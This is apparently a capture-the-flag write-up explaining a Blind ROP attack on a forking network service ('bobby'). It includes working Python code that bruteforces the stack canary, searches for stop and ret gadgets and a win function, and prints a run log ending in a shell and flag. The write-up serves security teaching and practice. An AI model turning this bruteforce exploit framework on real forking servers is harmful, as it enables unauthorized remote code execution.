level00 was a challenge related to blind exploitation. The goal was to open a shell inside it. The normal process is to reverse engineer the executable to get some proper knowledge of it and define what could be vulnerable.
The process is named bobby and its executable exists at `/opt` with limited privileges:

```sh
level00@override:~$ ls  -la /opt/override/bobby
-rwx------ 1 flag00 flag00 14408 Jun 10 12:00 /opt/override/bobby

```

Meaning that we can't follow the normal analysis process, and we need to notice the behaviors of the executable process directly:

```sh
level00@override:~$ ps aux | grep bobby
flag00       726  0.0  0.0   2548  1328 ?        Ss   14:43   0:00 /opt/override/bobby

```

Based on the intel we have, the executable is running as a service and exposed on port `4243`.
When trying to connect to the service called bobby using `nc 0.0.0.0 4243`, we noticed the following behavior:

```sh
level00@override:~$ ps aux | grep bobby
flag00       726  0.0  0.0   2548  1328 ?        Ss   14:43   0:00 /opt/override/bobby
flag00      9140  0.0  0.0   2548   416 ?        S    15:23   0:00 /opt/override/bobby

```

Hmm! Two processes of bobby, meaning each time someone tries to communicate with the bobby service, the parent process forks a child process for it!
This opens the path to exploit the fact that a child process inherits most of the binary protection randomized seeds from its parent. So, if the parent has a canary protection active, the child inherits the protection and the canary value itself. If we find a buffer overflow and crash the child, we can rely on whether the child crashed or not to bruteforce the canary out. Using some tricks around the idea of a child crashing or not crashing, we can find ourselves able to use the blind ROP (BROP) attack.

Quick and simplified recap for a Blind ROP attack:
Blind Return-Oriented Programming (BROP) attack is a hacking technique that lets an attacker exploit a system without having access to the target program's source code or binary file. Traditional exploits require a hacker to read the application's code beforehand to find instructions. BROP bypasses this entirely by reading memory remotely through a trial-and-error "side-channel."
The Core Requirement (How it Relies on Forking)
For a BROP attack to work, the target application must use a forking architecture (like many web servers or daemons).

* The Loophole: When a main server process forks a child process to handle a network request, the child inherits the exact same memory layout and security protections (like ASLR and Stack Canaries) as the parent.
* The Exploit Method: If a child process crashes due to a bad guess by the attacker, the main server simply re-runs a new child with the exact same memory states.

This allows the attacker to crash the application thousands of times, guessing the hidden security seeds byte-by-byte until they bypass them.

And voila! We know what attack we will be trying, but before anything else, let's build our assumptions first. We will start with the easier case of the blind ROP attack and the easier assumption, which we later proved is the one we are dealing with.

Using a blind ROP attack, we can execute the executable's internal functions with ease, especially the ones that don't require arguments, as it won't need us to find the proper gadgets for them. Just by knowing the entry address of the function, we can call it. Like that, we can build the assumption that there is a function inside the executable that calls `/bin/sh` for us. We may need to find a ret gadget to make sure that the call will work properly, as the system function requires the stack to be aligned by 16-bytes (due to the usage of SIMD instructions in it). So we need to find a ret gadget, but first things first.

In a blind ROP attack, there is a concept we need to use that allows this kind of attack to exist, which is:

`Stop Gadget`: An address in the code that pauses execution or keeps the connection open (like an infinite loop or a blocking network call).
While guessing memory locations, a successful guess usually causes a crash or process termination. It's hard to tell which one is which when we are using a script, or at least it is hard to know for sure. The attacker places a Stop Gadget immediately after a guess. If the server doesn't crash and keeps the connection alive, the attacker knows their previous guess was correct. So we know that the stop gadget can be anything that helps our service stay up.

So the idea and implementation are clear as the sun on a rainy day—everything is perfect!
Yes, finding the padding offset to cause the child process to crash was easy. Spoiler alert: it was 72. Building a simple bruteforce that finds the canary was also easy:

```py
    taddr = "localhost"
    tport = 4243
    PROMPT = b"[BOBBY] You don't know what you've gotten into: "
    TIMEOUT = 2
    C = b'X'
    # ...
    def check_b_crash(payload, b, debug=False):
    p = None
    try:
        p = create_connection()
        p.send(payload + bytes([b]))
        
        expected = [b"[BOBBY] Input received.", b"[MATRIX] Bobby Newmark \xe2\x80\x94 unauthorized access detected."]
        for _ in range(2):
            res = p.recv(timeout=TIMEOUT)
            if not any(exp in res for exp in expected):
                return False
                
        p.sendline(b"PING")
        return p.connected("recv")
    except (EOFError, PwnlibException, OSError):
        return False
    finally:
        if p: p.close()
    
    def bruteforce_nbyte(payload, n, debug=False):
    bts = b''
    for i in range(n):
        found = False
        for b in range(256):
            tmp = payload + bts
            print(f"[*] Bruteforcing byte {i+1}/{n} : {hex(b)} ...", end='')
            if check_b_crash(tmp, b, debug):
                bts += bytes([b])
                print("\r", end='')
                print(f"[+] 🪨 byte[{i+1}] = {hex(b)}                ")
                found = True
                break
            print("\r", end='')
        if not found:
            print(f"[x] Byte {i+1} failed to bruteforce!", file=sys.stderr)
            exit(1)
    return bts


    # 1. Find Padding
    padding = 1
    print("[>] Finding padding size...")
    while True:
        if check_b_crash(C * padding, 42):
            padding += 1
        else:
            print(f"[+] Padding found: {padding}")
            break

    # 2. Brute-force Canary
    canary = b'\x00' + bruteforce_nbyte(C * padding + b'\x00', 7)
    print(f"[+] Canary: {canary}")
    check_valid(C * padding + canary, debug="canary")

    building = C * padding + canary + (b'\x00' * 8)  # rbp placeholder

```

But finding the proper RIP of the gadgets and the win function (the function that calls the shell and that we built our assumption over) is not as easy, as we will have a lot of false positives (signs that falsely say we found it).

1. STOPGadget
A stop gadget is an address that can cause the connection to stay open for a long time, or even forever. It may be a long sleep or an infinite loop; it can be anything as long as it holds the connection for us. The goal is to find a stop gadget. To do this, we developed a `check_crash` function that is slightly different from the `check_b_crash` that we used to find the padding and the canary.

* `check_b_crash`: Checks if the byte we are testing causes a disconnection, or if it keeps following the standard response that we noticed.
* `check_crash`: Tries to find the difference between a disconnect and a continuous connection. The connection can follow the standard response or give a new state of the program that might give a new response (or anything else), as long as our connection is continuous. We call that state a TIMEOUT connection. In our new `check_crash`, we can distinguish the following statuses:
* `CheckStatus.CONNECTION_ERROR`, `CheckStatus.CONNECTION_CLOSED`: Disconnection or crash.
* `CheckStatus.TIMEOUT`: A valid case that causes a continuous connection (used to find STOPGADGET or RETGADGET/ret). TIMEOUT can literally mean any valid type of connection, as long as we tried our guess followed by a guaranteed STOPGADGET that ensures our target service will stay connected.
* `CheckStatus.SHELLEXECUTOR`: A case within the timeout where we can notice if we successfully called a shell.



So using `check_crash`, we can find out which type of guess causes our target server to stay connected and which causes it to disconnect.
Another important note: a disconnection can't strictly be judged as a crash. Why? Because a bruteforced address that is valid may still cause a disconnect if its internal logic guarantees that disconnection. Example:

```c
    system("cat /root/secret.txt")
    ...
    return 0 ;// or exit()

```

In this case, just the fact that it calls `system("cat /root/secret.txt")` and then returns/exits is terminal, meaning it doesn't hold the connection. To find these cases properly, we need a STOPGADGET. This means finding an address to a part of the code that keeps the connection alive or guarantees a continuous connection, even if it is not responsive. Just the fact that the service stays connected to us means we found a stop gadget. For that, we created the following helper functions:

```py
def check_crash(payload, debug=False):
    p = None
    try:
        p = create_connection()
        p.send(payload)
        response = p.recvline(timeout=TIMEOUT)
        
        if not p.connected("recv"):
            return CheckStatus.CONNECTION_CLOSED

        for _ in range(4):
            p.send(b"echo PWNED\n")
            res = p.recv(timeout=TIMEOUT)
            if b"PWNED" in res:
                return CheckStatus.SHELLEXECUTOR
            if not p.connected("recv"):
                return CheckStatus.CONNECTION_CLOSED
                
        return CheckStatus.TIMEOUT
    except (EOFError, PwnlibException, OSError) as exc:
        if debug: print("[DEBUG] Connection error:", repr(exc))
        return CheckStatus.CONNECTION_ERROR
    finally:
        if p: p.close()

# --- TOP-LEVEL HELPER FUNCTIONS (Picklable for Multiprocessing) ---
def pack_16bit(b):
    return p16(b) + b'\x40\x00\x00\x00\x00\x00'

def is_timeout(status):
    return status == CheckStatus.TIMEOUT

def is_not_closed(status):
    return status not in [CheckStatus.CONNECTION_ERROR, CheckStatus.CONNECTION_CLOSED]

def is_shellexecutor(status):
    return status == CheckStatus.SHELLEXECUTOR


# --- GENERALIZED MULTIPROCESSING SEARCH ENGINE ---
def _worker_gadget_task(args):
    prefix, suffix, pack_func_name, start, end, step, condition_name = args
    
    # Map function names back to actual callables inside the worker process
    pack_func = globals()[pack_func_name]
    success_condition = globals()[condition_name]

    for b in range(start, end, step):
        gadget = pack_func(b)
        tmp = prefix + gadget + suffix
        status = check_crash(tmp)
        if success_condition(status):
            print(f"[+] Found matching gadget: {gadget.hex()} (status: {status})", file=sys.stderr)
            return gadget
    return None

def brute_gadget(prefix, suffix, pack_func_name, start, end, condition_name, step=1, workers=4):
    chunk_size = (end - start) // workers
    tasks = []
    for i in range(workers):
        w_start = start + (i * chunk_size)
        w_end = w_start + chunk_size if i < (workers - 1) else end
        tasks.append((prefix, suffix, pack_func_name, w_start, w_end, step, condition_name))

    with multiprocessing.Pool(processes=workers) as pool:
        for result in pool.imap_unordered(_worker_gadget_task, tasks):
            if result is not None:
                pool.terminate()
                return result
    return b''


```

As you can see, its only goal is to find the address that results in the TIMEOUT case, which we consider our stop gadget:

```py
# 3. Find STOP Gadget (Using Multiprocessing)
print("[>] Searching for STOP gadget...")
STOP_GADGET = brute_gadget(
    prefix=building,
    suffix=b'',
    pack_func_name="pack_16bit",
    start=0x610,
    end=0xffff,
    condition_name="is_timeout"
)
print(f"[+] STOP gadget: {STOP_GADGET.hex()}")

```

2. RETGADGET/ret:
When we find the stop gadget, we will try to find a ret gadget. The main idea is that `ret` is an assembly instruction equivalent to `pop rip`, meaning that we will get 8 bytes from the top of the stack and put them into the `rip`.
To find the `ret` gadget, we will put our guessed address after the fake-rbp, and put the STOPGADGET after it. So whenever we find an instruction that causes a timeout, we are guaranteed to have found our ret.
The payload will be:

```py
    b"C"*padding + canary + fake_rbp + GUSSED_RET + STOP 

```

NOTE:
What if our guess was also a STOP gadget and caused a TIMEOUT case? In that case, it will fail in later stages, and we can experiment with another probable ret instruction address. After all, it's a matter of trial and error (we may try to find the ret gadget in ranges where we couldn't find a TIMEOUT when searching for the STOPGADGET, which will help guarantee it).
Another idea: to confirm that we found a ret gadget (and not just another stop gadget), we can try to execute it without the STOPGADGET at the end of the payload, and that should result in a CLOSED connection status.

Our call to find the `ret` is:

```py
# 4. Find Return Gadget (Using Multiprocessing)
print("[>] Searching for RET gadget...")
ret = brute_gadget(
    prefix=building,
    suffix=STOP_GADGET,
    pack_func_name="pack_16bit",
    start=0x610,
    end=0xffff,
    condition_name="is_not_closed"
)
print(f"[+] RET gadget: {ret.hex()}")

```

3. WIN function:
After finding the stop and the ret gadget, we will be using them to find the win function using the following payload format:

```py
    b"C"*padding + canary + fake_rbp + ret + GUSSED_WIN + STOP

```

And using the same function tools we can try to search for the WIN function address:

```py
# 5. Find WIN Function (Using Multiprocessing)
print("[>] Searching for WIN function...")
WIN = brute_gadget(
    prefix=building_rbp_ret,
    suffix=STOP_GADGET,
    pack_func_name="p64",
    start=0x401000,
    end=0x401400,
    condition_name="is_shellexecutor"
)

if len(WIN) == 8:
    print(f"[+] WIN address acquired: {WIN.hex()}")
    getFlag(building_rbp_ret + WIN + STOP_GADGET)
else:
    print("[-] Unable to get a shell!")

```

And like that, our approach result was:

```sh
level00@override:~$ time python3 exploit.py 
[>] Finding padding size...
[+] Padding found: 72
[+] 🪨 byte[1] = 0xd4           4 ...
[+] 🪨 byte[2] = 0x2d           d ...
[+] 🪨 byte[3] = 0x4a           a ...
[+] 🪨 byte[4] = 0x1d           d ...
[+] 🪨 byte[5] = 0xa1           1 ...
[+] 🪨 byte[6] = 0xc9           9 ...
[+] 🪨 byte[7] = 0x2            2 ...
[+] Canary: b'\x00\xd4-J\x1d\xa1\xc9\x02'
[>] Searching for STOP gadget...
[+] Found matching gadget: 0512400000000000 (status: CheckStatus.TIMEOUT)
[+] STOP gadget: 0512400000000000
[>] Searching for RET gadget...
[+] Found matching gadget: 0010400000000000 (status: CheckStatus.TIMEOUT)
[+] RET gadget: 0010400000000000
[>] Searching for WIN function...
[+] Found matching gadget: 7f13400000000000 (status: CheckStatus.SHELLEXECUTOR)
[+] WIN address acquired: 7f13400000000000
Flag{lo81wzpwryp6ttti84lxp15rdl8rj5w3}

real    42m35.915s
user    0m20.446s
sys     0m7.054s

```

Yeah, it took quite some time! We used 4 worker processes and limited the range of the search to the area where we found these addresses when we were experimenting, and voila, that is it.